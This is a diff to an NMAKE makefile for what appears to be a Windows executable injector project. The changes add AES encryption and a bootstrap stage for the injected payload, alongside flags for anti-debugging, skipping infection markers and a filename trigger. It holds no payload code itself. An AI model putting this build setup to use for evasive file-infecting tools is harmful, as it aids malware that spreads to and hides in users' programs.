@@ -9,25 +9,55 @@ CPPFLAGS = $(CPPFLAGS) $(_FLAGS) /std:c++20
 CXXFLAGS = $(CXXFLAGS) $(_FLAGS) /std:c++20
 LFLAGS = $(LFLAGS) /NOFUNCTIONPADSECTION:injected
 AFLAGS = $(AFLAGS) /W3 /Cx
-CF_DBG = /DDEBUG  # General debug mode
+CF_DBG = /DDEBUG /DNO_ENCRYPT  # General debug mode
 CF_OPT = /Os /Oi /Zl  # Optimize for size
 TARGET_SRC = $(HELLO_EXE)
 TARGET_DST = dummy.exe
 
-!IF DEFINED(PL_DEBUG) & "$(PL_DEBUG)" != "0"
-CF_PLDBG = /DPL_DEBUG  # Payload debug mode (MsgBox)
+# Compilation flags
+!IF DEFINED(PL_DEBUG) && "$(PL_DEBUG)" != "0"
+CF_PLDEBUG = /DPL_DEBUG  # Payload debug mode (MsgBox)
 !ENDIF
-!IF DEFINED(NEED_BANG) & "$(NEED_BANG)" != "0"
+!IF DEFINED(NEED_BANG) && "$(NEED_BANG)" != "0"
 CF_NEEDBANG = /DNEED_BANG  # Make payload require '!' as first char in filename
 !ENDIF
-!IF DEFINED(SKIP_SIGN) & "$(SKIP_SIGN)" != "0"
+!IF DEFINED(SKIP_SIGN) && "$(SKIP_SIGN)" != "0"
 CF_SKIPSIGN = /DSKIP_SIGN  # Skip signature verification (allow multiple injections)
 !ENDIF
-!IF DEFINED(NO_ANTIDBG) & "$(NO_ANTIDBG)" != "0"
+!IF DEFINED(NO_ANTIDBG) && "$(NO_ANTIDBG)" != "0"
 CF_NOANTIDBG = /DNO_ANTIDBG  # Disable anti-debugging
 !ENDIF
+!IF DEFINED(NO_ENCRYPT) && "$(NO_ENCRYPT)" != "0"
+CF_NOENCRYPT = /DNO_ENCRYPT  # Disable payload encryption
+!ENDIF
 
-CF_EXTRA = $(CF_PLDBG) $(CF_NEEDBANG) $(CF_SKIPSIGN) $(CF_NOANTIDBG)
+# AES key and IV
+!IF DEFINED(AES_KEY) && DEFINED(AES_KEY_HEX)
+!ERROR Cannot define both AES_KEY and AES_KEY_HEX
+!ENDIF
+!IF DEFINED(AES_IV) && DEFINED(AES_IV_HEX)
+!ERROR Cannot define both AES_IV and AES_IV_HEX
+!ENDIF
+
+!IFDEF AES_KEY
+CF_AES_KEY = /D_CONF_AES_KEY="$(AES_KEY)"
+!ENDIF
+!IFDEF AES_IV
+CF_AES_IV = /D_CONF_AES_IV="$(AES_IV)"
+!ENDIF
+!IFDEF AES_KEY_HEX
+CF_AES_KEY = /D_CONF_AES_KEY_HEX="$(AES_KEY_HEX)"
+!ENDIF
+!IFDEF AES_IV_HEX
+CF_AES_IV = /D_CONF_AES_IV_HEX="$(AES_IV_HEX)"
+!ENDIF
+
+# Verbose mode for injector
+!IF DEFINED(VERBOSE) && "$(VERBOSE)" != "0"
+INJ_VERBOSE = -v
+!ENDIF
+
+CF_EXTRA = $(CF_PLDEBUG) $(CF_NEEDBANG) $(CF_SKIPSIGN) $(CF_NOANTIDBG) $(CF_NOENCRYPT) $(CF_AES_KEY) $(CF_AES_IV)
 
 all: inject
 
@@ -39,7 +69,7 @@ all: inject
 	$(CPP) $(CPPFLAGS) $(CF_EXTRA) /c $<
 
 # Executable entry points: do not apply /Zl (omit default library names)
-inject.obj: inject.cpp payload.h utils.h
+inject.obj: inject.cpp encrypt.hpp payload.h utils.h
 	$(CPP) $(CPPFLAGS) $(CF_EXTRA) /c inject.cpp /Fo"$@"
 
 readpe.obj: readpe.c utils.h
@@ -49,6 +79,13 @@ test_aes.obj: test_aes.c libaes.h utils.h
 	$(CC) $(CFLAGS) $(CF_EXTRA) /c test_aes.c /Fo"$@"
 
 # Library objects: apply /Zl (omit default library names) and other aggressive size optimizations
+!IFNDEF CF_NOENCRYPT
+payload_bootstrap.obj: payload_bootstrap.cpp payload.h encrypt.hpp injected.h libproc.hpp utils.h
+!ELSE
+payload_bootstrap.obj: payload_bootstrap.cpp payload.h injected.h libproc.hpp utils.h
+!ENDIF
+	$(CPP) $(CPPFLAGS) $(CF_OPT) $(CF_EXTRA) /c payload_bootstrap.cpp /Fo"$@"
+
 payload.obj: payload.cpp payload.h injected.h libproc.hpp utils.h
 	$(CPP) $(CPPFLAGS) $(CF_OPT) $(CF_EXTRA) /c payload.cpp /Fo"$@"
 
@@ -62,6 +99,9 @@ libaes.obj: libaes.c libaes.h injected.h utils.h
 	$(CC) $(CFLAGS) $(CF_OPT) $(CF_EXTRA) /c libaes.c /Fo"$@"
 
 # Library objects for debug builds
+payload_bootstrap_dbg.obj: payload_bootstrap.cpp payload.h injected.h libproc.hpp utils.h
+	$(CPP) $(CPPFLAGS) $(CF_OPT) $(CF_EXTRA) $(CF_DBG) /c payload_bootstrap.cpp /Fo"$@"
+
 payload_dbg.obj: payload.cpp payload.h injected.h libproc.hpp utils.h
 	$(CPP) $(CPPFLAGS) $(CF_OPT) $(CF_EXTRA) $(CF_DBG) /c payload.cpp /Fo"$@"
 
@@ -70,10 +110,14 @@ libproc_dbg.obj: libproc.cpp libproc.hpp injected.h utils.h
 
 
 # Executables
-"$(INJECT_EXE)": payload_begin.obj libproc.obj payload.obj payload_end.obj utils.obj inject.obj
+!IFNDEF CF_NOENCRYPT
+"$(INJECT_EXE)": payload_begin.obj libproc.obj libaes.obj payload_bootstrap.obj payload_enc_begin.obj payload.obj payload_end.obj utils.obj inject.obj
+!ELSE
+"$(INJECT_EXE)": payload_begin.obj libproc.obj payload_bootstrap.obj payload.obj payload_end.obj utils.obj inject.obj
+!ENDIF
 	link $(LFLAGS) /OUT:$@ $**
 
-"$(PAYLOAD_EXE)": payload_begin.obj libproc_dbg.obj payload_dbg.obj payload_end.obj payload_main.obj
+"$(PAYLOAD_EXE)": payload_begin.obj libproc_dbg.obj payload_bootstrap_dbg.obj payload_dbg.obj payload_end.obj payload_main.obj
 	link $(LFLAGS) /OUT:$@ $** /DEBUG
 
 "$(READPE_EXE)": utils.obj readpe.obj
@@ -109,7 +153,7 @@ dummy: hello .PHONY
 	copy /Y "$(TARGET_SRC)" "!2$(TARGET_DST)"
 
 run: inject dummy .PHONY
-	"$(INJECT_EXE)" "$(TARGET_DST)"
+	"$(INJECT_EXE)" "$(TARGET_DST)" $(INJ_VERBOSE)
 
 run_payload: payload dummy .PHONY
 	"$(PAYLOAD_EXE)"
